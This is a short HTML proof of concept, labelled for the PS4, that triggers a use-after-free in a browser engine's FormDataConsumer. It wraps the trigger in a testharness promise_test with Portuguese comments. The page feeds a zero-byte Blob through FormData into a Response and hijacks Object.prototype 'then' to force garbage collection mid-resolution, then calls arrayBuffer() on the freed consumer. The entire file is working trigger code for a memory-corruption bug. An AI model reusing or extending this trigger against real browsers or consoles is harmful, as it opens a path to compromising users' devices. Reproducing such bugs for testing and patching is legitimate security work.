<!DOCTYPE html>
<html>
<head><title>FormDataConsumer UAF — PS4 PoC</title></head>
<body>
<script src="resources/gc.js"></script>
<script src="resources/testharness.js"></script>
<script src="resources/testharnessreport.js"></script>
<script>
promise_test(async () => {
    // Sem IndexedDB: blob zero-byte direto
    const emptyBlob = new Blob([]);
    // Alternativa: const emptyBlob = new Blob(['dados']).slice(0, 0);

    const formData = new FormData();
    formData.append('a', emptyBlob);

    let response = new Response(formData);

    // Object.prototype.then getter:
    // Dispara durante resolução de Promises (checagem de thenability).
    // Garante que o GC rode no momento em que FetchBodyConsumer resolve
    // a promise após receber o primeiro span vazio — liberando os recursos
    // antes que o segundo span vazio chegue.
    Object.prototype.__defineGetter__('then', () => {
        response = null;
        gc();
    });

    response.arrayBuffer();
    // ↑ Não usa await — o getter precisa disparar durante o processamento
    //   assíncrono interno, não depois da resolução completa.
}, 'UAF em FormDataConsumer::consume via blob zero-byte (sem IndexedDB)');
</script>
</body>
</html>
